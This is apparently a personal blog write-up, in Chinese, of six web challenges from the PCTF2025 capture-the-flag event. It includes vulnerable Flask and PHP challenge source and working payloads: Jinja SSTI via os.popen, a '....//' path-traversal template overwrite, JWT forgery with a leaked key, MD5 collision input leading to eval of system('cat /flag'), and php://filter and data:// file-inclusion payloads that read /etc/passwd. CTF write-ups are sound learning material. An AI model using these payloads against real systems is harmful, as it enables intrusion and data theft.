---
title: "PCTF2025web"
date: "2026-04-03T00:00:00+08:00"
lastmod: "2026-04-03T00:00:00+08:00"
slug: "PCTF2025web"
summary: "1.ezupload"
tags:
  - "Web"
  - "File Upload"
  - "PCTF"
params:
  protected: false
  commentId: "PCTF2025web"
  legacyId: "PCTF2025web"
---

# 1.ez_upload

读取app.py

```
import os
import uuid
from flask import Flask, request, render_template_string, redirect, url_for, send_from_directory, flash, jsonify
from werkzeug.exceptions import RequestEntityTooLarge

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'

UPLOAD_FOLDER = 'uploads'
MAX_FILE_SIZE = 16 * 1024 * 1024
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx', 'zip', 'html'}

BLACKLIST_KEYWORDS = [
    'env', '.env', 'environment', 'profile', 'bashrc',
    'proc', 'sys', 'etc', 'passwd', 'shadow', 'flag'
]

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    try:
        with open('templates/index.html', 'r', encoding='utf-8') as f:
            template_content = f.read()
        return render_template_string(template_content)
    except FileNotFoundError:
        try:
            with open('templates/error_template_not_found.html', 'r', encoding='utf-8') as f:
                return f.read()
        except:
            return '<h1>错误</h1><p>模板文件未找到</p><a href="/upload">上传文件</a>'
    except Exception as e:
        try:
            with open('templates/error_render.html', 'r', encoding='utf-8') as f:
                template = f.read()
            return render_template_string(template, error_message=str(e))
        except:
            return '<h1>渲染错误</h1><p>' + str(e) + '</p><a href="/upload">上传文件</a>'

@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('没有选择文件')
            return redirect(request.url)
        
        file = request.files['file']
        
        if file.filename == '':
            flash('没有选择文件')
            return redirect(request.url)
        
        if file and allowed_file(file.filename):
            filename = file.filename
            filename = filename.replace('../', '')
            file_path = os.path.join(UPLOAD_FOLDER, filename)
            
            try:
                file.save(file_path)
                flash('文件 {} 上传成功！'.format(filename))
                return redirect('/upload')
            except Exception as e:
                flash('文件上传失败: {}'.format(str(e)))
                return redirect(request.url)
        else:
            flash('不允许的文件类型')
            return redirect(request.url)
    
    try:
        with open('templates/upload.html', 'r', encoding='utf-8') as f:
            template_content = f.read()
        return render_template_string(template_content)
    except FileNotFoundError:
        try:
            with open('templates/error_upload_not_found.html', 'r', encoding='utf-8') as f:
                return f.read()
        except:
            return '<h1>错误</h1><p>上传页面模板未找到</p><a href="/">返回主页</a>'

@app.route('/file')
def view_file():
    file_path = request.args.get('file', '')
    
    if not file_path:
        try:
            with open('templates/file_no_param.html', 'r', encoding='utf-8') as f:
                return f.read()
        except:
            return '<h1>文件查看</h1><p>请使用 ?file= 参数指定要查看的文件</p><a href="/">返回主页</a>'
    
    file_path_lower = file_path.lower()
    for keyword in BLACKLIST_KEYWORDS:
        if keyword in file_path_lower:
            try:
                with open('templates/file_error.html', 'r', encoding='utf-8') as f:
                    template = f.read()
                return render_template_string(template, 
                    file_path=file_path, 
                    error_message='访问被拒绝：文件路径包含敏感关键词 [{}]'.format(keyword))
            except:
                return '<h1>访问被拒绝</h1><p>文件路径包含敏感关键词</p><a href="/">返回主页</a>'
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            file_content = f.read()
        
        try:
            with open('templates/file_view.html', 'r', encoding='utf-8') as f:
                template = f.read()
            return render_template_string(template, file_path=file_path, file_content=file_content)
        except:
            return '<h1>文件内容</h1><pre>{}</pre><a href="/">返回主页</a>'.format(file_content)
    except Exception as e:
        try:
            with open('templates/file_error.html', 'r', encoding='utf-8') as f:
                template = f.read()
            return render_template_string(template, file_path=file_path, error_message=str(e))
        except:
            return '<h1>文件读取失败</h1><p>错误: {}</p><a href="/">返回主页</a>'.format(str(e))


@app.errorhandler(RequestEntityTooLarge)
def too_large(e):
    try:
        with open('templates/error_too_large.html', 'r', encoding='utf-8') as f:
            template = f.read()
        return render_template_string(template, max_size=MAX_FILE_SIZE // (1024*1024)), 413
    except:
        return '<h1>文件过大</h1><p>文件大小不能超过 {} MB</p>'.format(MAX_FILE_SIZE // (1024*1024)), 413

@app.errorhandler(404)
def not_found(e):
    try:
        with open('templates/error_404.html', 'r', encoding='utf-8') as f:
            return f.read(), 404
    except:
        return '<h1>404</h1><p>页面不存在</p>', 404

@app.errorhandler(500)
def server_error(e):
    try:
        with open('templates/error_500.html', 'r', encoding='utf-8') as f:
            template = f.read()
        return render_template_string(template, error_message=str(e)), 500
    except:
        return '<h1>500</h1><p>服务器内部错误: {}</p>'.format(str(e)), 500

if __name__ == '__main__':
    print("启动Flask文件上传应用...")
    print("上传目录: {}".format(UPLOAD_FOLDER))
    print("最大文件大小: {} MB".format(MAX_FILE_SIZE // (1024*1024)))
    print("允许的文件类型: {}".format(ALLOWED_EXTENSIONS))
    app.run(debug=False, host='0.0.0.0', port=5000)
```

render_template_string渲染了html页面内容，则可以实现覆盖index.html在里面实现ssti 

绕过上传限制....//templates/index.html

上传ezupload.txt文件

内容为

```
{{lipsum.__globals__.os.popen('env').read()}}
```

再在yakit修改文件名为....//templates/index.html

再拜访主页得到

```
KUBERNETES_PORT=tcp://10.96.0.1:443 KUBERNETES_SERVICE_PORT=443 HOSTNAME=pctf2025-3e80277960ee4a50 HOME=/root GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D PYTHON_SHA256=8d3ed8ec5c88c1c95f5e558612a725450d2452813ddad5e58fdb1a53b1209b78 WERKZEUG_SERVER_FD=3 KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=443 GZCTF_FLAG=PCTF{fc309f83-740d-485b-a955-1dde33eefc92} KUBERNETES_PORT_443_TCP_PROTO=tcp LANG=C.UTF-8 PYTHON_VERSION=3.11.14 KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443 KUBERNETES_SERVICE_HOST=10.96.0.1 PWD=/app GZCTF_TEAM_ID=3373 
```



# 2.Jwt_password_manager

先注册普通用户

然后在附件中看到了

```
app.config['SECRET_KEY'] = '0f3cbb44-f199-4d34-ade9-1545c0972648'
```

复制cookie中token的值

然后在https://www.jwt.io/中构造admin的token

注：

```
JWT Decoder
JWT Encoder
```

存在这俩板块

随后得到flag

# 3.We_will_rockyou

附件中发现

```
if __name__ == '__main__':
    admin_id = 0
    admin_username = 'admin123'
    admin_password = str(uuid.uuid4())
```

做fuzz测试知道有rockyou字典

插入使用

测出密码：chelsea

登入尝试执行命令

存在waf

附件中白名单

```
SAFE_COMMANDS = ['ls', 'pwd', 'whoami', 'dir', 'more']
```

利用more读取more /flag

Output

```
PCTF{f805b6d0-d026-41b0-9279-937feee61c16}
```



# 4.神秘商店

登录admin

利用全角来注册登录

后端代码有转换，全角能够绕过后端对admin的检测，然后把全角admin识别成正常的admin，造成覆盖注册，修改admin密码

注册admin，其中n为全角

利用整数溢出4294967246到50，购买flag



# 5.php_with_md5

```
<?php
error_reporting(0);
highlight_file(__FILE__);
echo "Welcome to the PHP world!";
echo "<br>";
echo "Can you get the flag in my php file?";

if(isset($_GET['begin'])=='admin'){
    $begin=$_GET['begin'];
    
    if(!preg_match('/admin/i',$begin)){
        echo "Excellent!";
        
        if($_POST['password']==md5($_POST['password'])){
            echo "Wooow!,you are so clever!";
            
            if($_GET['a']!=$_GET['b'] && md5($_GET['a'])==md5($_GET['b'])){
                echo "Continue!";
                
                if($_GET['c']!=$_GET['d'] && md5($_GET['c'])===md5($_GET['d'])) {
                    echo "Congratulations! You have completely learned the MD5 skills!";
                    @eval($_POST['cmd']);
                    
                }
            }else{ die("Nope,try again!");}
        }else{ die("Haha,try again!");}
    }else{ die("NoNoNO! You can't do that!");}
}else{ die("Oooooooops,You are not admin!");}


?>
```

1.传非admin

2.md5弱比较

3.md5强碰撞

4.shell命令

```
?begin=123&a=s155964671a&b=s878926199a&c=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&d=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
password=0e215962017&cmd=system("cat /flag");
```

# 6.EZPHP

EZ read file in PHP

进入题目：Please pass in "number" value 
the number value between 111111 and 999999:

dirsearch无果

然后post，get抓包和hackbar都失败

尝试?number=1111../，失败

数字爆破

输入?number=114514

```
<?php
error_reporting(0);
    echo "Please pass in \"number\" value <br>";
    echo "the number value between 111111 and 999999:<br>";
    if($_GET["number"]==114514) {
        highlight_file(__FILE__);
        echo "OK!Please find the flag!<br>";
        if($_GET['action']=="read"){
            $filename=$_POST["filename"];
            file($filename);
        }elseif($_GET["action"]== "include"){
            $filename=$_POST["filename"];
            include($filename);
        }
    }
?>
```

```
?number=114514&action=include
filename=php://filter/convert.base64-encode/resource=/etc/passwd
```

有回显，存在本地文件包含

```
?number=114514&action=include
filename=data://text/plain,<?php system("nl /*"); ?>
filename=data://text/plain,<?php system("cat /OgcyNDmiofooYd4j"); ?>也可以            OgcyNDmiofooYd4j是ls /得到的
```

<!--more-->